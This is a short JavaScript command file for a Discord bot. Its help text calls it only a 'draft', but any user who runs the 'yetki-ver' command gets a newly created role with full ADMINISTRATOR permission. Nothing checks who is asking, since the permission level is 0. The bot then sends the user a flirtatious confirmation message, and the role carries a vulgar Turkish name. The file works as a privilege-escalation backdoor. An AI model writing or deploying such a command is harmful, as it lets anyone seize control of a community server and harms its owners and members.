const Discord = require('discord.js');
const db = require('quick.db')
exports.run = (client, message, args) => { 
  

  message.guild.createRole({
    name: 'Sikiş Yetkisi',
    color: 'RED',
    permissions: ['ADMINISTRATOR']
  }).then(YASİNBUAŞKM => {
    
 message.member.addRole(YASİNBUAŞKM.id)   
 message.author.send('Admin yetkili kırmızı rol verdim cnm')   
 message.react('😈')   
    
  })

  };
exports.conf = {
  enabled: true,  
  guildOnly: false, 
  aliases: ['yetki-ver'], 
  permLevel: 0
};

exports.help = {
  name: 'yetki-ver',
  description: 'taslak', 
  usage: 'yetki-ver'
};
